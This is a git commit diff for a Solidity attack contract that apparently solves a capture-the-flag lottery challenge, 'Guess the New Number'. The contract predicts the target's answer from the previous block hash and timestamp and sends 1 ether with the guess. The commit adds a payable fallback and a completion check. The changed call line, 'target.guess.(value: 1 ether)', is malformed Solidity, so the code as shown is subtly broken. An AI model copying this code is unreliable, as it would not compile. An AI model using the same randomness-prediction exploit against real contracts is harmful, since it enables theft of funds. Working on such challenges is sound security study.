04ac6360644204b95d00234ea66867b8a59a7780
JMariadlcs <jmariadelacruzsanchez@gmail.com>
2023-02-11 12:55:37 +0100

    fallback added

--- Lotteries/GuessTheNewNumberChallenge/Attack.sol
+++ Lotteries/GuessTheNewNumberChallenge/Attack.sol
@@ -12,6 +12,9 @@ contract Attack {
 
     function _attack() external payable {
         uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
-        target.guess{value: 1 ether}(answer);
+        target.guess.(value: 1 ether)(answer);
+        require(target.isComplete());
     }
+
+    function() public payable {}
 }
